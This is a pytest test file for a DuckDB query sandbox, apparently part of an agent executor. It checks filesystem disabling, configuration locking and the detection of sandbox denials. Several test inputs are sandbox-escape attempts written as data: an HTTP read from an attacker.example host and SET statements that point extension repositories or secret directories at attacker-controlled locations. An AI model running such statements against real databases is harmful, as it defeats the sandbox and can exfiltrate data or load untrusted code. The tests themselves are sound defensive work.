"""DuckDB sandbox applied via ``open_and_attach``.

These pin the verified DuckDB 1.5.4 behaviour the sandbox relies on:

- an empty ``disabled_filesystems`` is a no-op, and disabling ``HTTPFileSystem``
  blocks HTTP access while leaving local materialization (the result-Parquet
  write path) working;
- an unrecognized filesystem name is skipped with a warning rather than passed
  through — DuckDB accepts any string silently, so a typo would otherwise look
  like a defense while enforcing nothing;
- ``lock_configuration`` (with ``allowed_configs``) stops a session statement
  re-widening the sandbox with ``SET``, while leaving writable everything the
  runner itself sets after the sandbox is applied.
"""

import duckdb
import pytest

from agent.executor.runner import (
    _ALLOWED_CONFIGS,
    _apply_sandbox,
    _is_sandbox_denial,
    open_and_attach,
)


def test_empty_sandbox_is_a_noop(tmp_path):
    conn = open_and_attach(disabled_filesystems="")
    # Local writes (result materialization) must still work with no restriction.
    out = tmp_path / "ok.parquet"
    conn.execute(f"COPY (SELECT 1 AS n) TO '{out}' (FORMAT PARQUET)")
    assert out.exists()


def test_disabling_http_blocks_http_but_not_local(tmp_path):
    conn = open_and_attach(disabled_filesystems="HTTPFileSystem")
    # Local COPY (how results are materialized) still works.
    out = tmp_path / "ok.parquet"
    conn.execute(f"COPY (SELECT 1 AS n) TO '{out}' (FORMAT PARQUET)")
    assert out.exists()
    # An http(s) read — the real exfiltration/oracle vector, since DuckDB does
    # not implement HTTP *writes* at all — is rejected by DuckDB.
    with pytest.raises(duckdb.Error):
        conn.execute("SELECT * FROM read_csv('https://attacker.example/x.csv')")


def test_apply_sandbox_accepts_multiple_names(tmp_path):
    conn = duckdb.connect()
    # Comma/space separated list applies each filesystem (the value is write-only
    # in DuckDB, so assert the functional effect: local writes are blocked too).
    _apply_sandbox(conn, "HTTPFileSystem, LocalFileSystem", lock_config=False)
    with pytest.raises(duckdb.Error):
        conn.execute(f"COPY (SELECT 1 AS n) TO '{tmp_path / 'x.parquet'}' (FORMAT PARQUET)")


def test_apply_sandbox_none_and_blank_are_noops():
    _apply_sandbox(duckdb.connect(), None, lock_config=False)
    _apply_sandbox(duckdb.connect(), "   ", lock_config=False)


def test_unknown_filesystem_is_skipped_with_a_warning(tmp_path, caplog):
    """A typo must be loud, not silently ineffective.

    DuckDB accepts ``SET disabled_filesystems='BogusFileSystem'`` without error,
    so passing an unrecognized name straight through would produce a setting that
    reads as a defense and enforces nothing.
    """
    conn = duckdb.connect()
    with caplog.at_level("WARNING"):
        _apply_sandbox(conn, "BogusFileSystem", lock_config=False)
    assert "BogusFileSystem" in caplog.text
    # Nothing was disabled, so a local write still works.
    out = tmp_path / "ok.parquet"
    conn.execute(f"COPY (SELECT 1 AS n) TO '{out}' (FORMAT PARQUET)")
    assert out.exists()


def test_known_names_still_applied_alongside_an_unknown_one(tmp_path, caplog):
    conn = duckdb.connect()
    with caplog.at_level("WARNING"):
        _apply_sandbox(conn, "LocalFileSystem BogusFileSystem", lock_config=False)
    assert "BogusFileSystem" in caplog.text
    # The valid name was still applied.
    with pytest.raises(duckdb.Error):
        conn.execute(f"COPY (SELECT 1 AS n) TO '{tmp_path / 'x.parquet'}' (FORMAT PARQUET)")


# ── lock_configuration ────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "statement",
    [
        # The filesystem sandbox itself must not be re-openable.
        "SET disabled_filesystems=''",
        # Nor the settings that would let a statement widen its reach.
        "SET secret_directory='/tmp/evil'",
        "SET extension_directory='/tmp/evil'",
        "SET home_directory='/tmp/evil'",
        "SET custom_extension_repository='http://attacker.example/'",
        "SET allow_unsigned_extensions=true",
        # Nor the lock and its exception list.
        "SET lock_configuration=false",
        "SET allowed_configs=['enable_external_access']",
    ],
)
def test_locked_configuration_rejects_sandbox_widening(statement):
    conn = open_and_attach(disabled_filesystems="HTTPFileSystem", lock_config=True)
    with pytest.raises(duckdb.Error):
        conn.execute(statement)


@pytest.mark.parametrize(
    "statement",
    [
        # _run_one_statement sets these per statement.
        "SET memory_limit='1GB'",
        "SET threads=2",
        # The SET subset the API statement policy deliberately admits. search_path
        # and schema are not configuration options, so the lock never touched them.
        "SET timezone='UTC'",
        "SET search_path='main'",
    ],
)
def test_locked_configuration_still_allows_the_runner(statement):
    """The regression guard: locking must not break what the runner does after it.

    If this fails, every query on a locked connection fails — the lock is applied
    before ``_run_one_statement`` sets the statement's resource slice and profile.
    """
    conn = open_and_attach(lock_config=True)
    conn.execute(statement)


def test_locked_configuration_still_allows_profiling(tmp_path):
    """`_run_one_statement`'s profile capture, in its real order.

    ``profiling_output`` only accepts a path once ``enable_profiling`` names the
    matching format, so this asserts the sequence rather than each PRAGMA alone.
    """
    conn = open_and_attach(lock_config=True)
    conn.execute("PRAGMA enable_profiling='json'")
    conn.execute(f"PRAGMA profiling_output='{tmp_path / 'profile.json'}'")
    conn.execute('PRAGMA custom_profiling_settings=\'{"CPU_TIME": "true"}\'')
    conn.execute("SELECT 1")
    conn.execute("PRAGMA disable_profiling")


def test_locked_configuration_allows_secret_and_attach():
    """The credential re-vend path (`_attach_catalogs`) must survive the lock."""
    conn = open_and_attach(lock_config=True)
    conn.execute("CREATE OR REPLACE SECRET s (TYPE S3, KEY_ID 'a', SECRET 'b')")
    conn.execute("ATTACH ':memory:' AS extra")


def test_allowed_configs_covers_every_setting_the_runner_writes():
    """`_ALLOWED_CONFIGS` is the contract between the lock and the runner."""
    assert set(_ALLOWED_CONFIGS) == {
        "memory_limit",
        "threads",
        "TimeZone",
        "enable_profiling",
        "profiling_output",
        "custom_profiling_settings",
    }


# ── Observability: distinguishing a sandbox denial from a user error ─────────


@pytest.mark.parametrize(
    ("setup", "statement"),
    [
        (["SET disabled_filesystems='HTTPFileSystem'"], "SELECT * FROM read_csv('http://x/a.csv')"),
        (
            ["SET allowed_configs=['threads']", "SET lock_configuration=true"],
            "SET secret_directory='/tmp/evil'",
        ),
    ],
)
def test_sandbox_denials_are_recognized(setup, statement):
    conn = duckdb.connect()
    conn.execute("LOAD httpfs")
    for sql in setup:
        conn.execute(sql)
    with pytest.raises(duckdb.Error) as exc:
        conn.execute(statement)
    assert _is_sandbox_denial(exc.value)


@pytest.mark.parametrize(
    "statement",
    [
        "SELECT * FROM no_such_table",
        "SET no_such_setting = 'x'",
        "SELCT 1",
        "SELECT CAST('abc' AS INTEGER)",
    ],
)
def test_ordinary_user_errors_are_not_reported_as_sandbox_denials(statement):
    """Otherwise every typo would look like an attempted escape in the logs."""
    conn = duckdb.connect()
    with pytest.raises(duckdb.Error) as exc:
        conn.execute(statement)
    assert not _is_sandbox_denial(exc.value)


def test_lock_is_off_by_default_in_open_and_attach():
    """`lock_config` defaults to False so callers opt in explicitly."""
    conn = open_and_attach()
    conn.execute("SET secret_directory='/tmp/still-writable'")
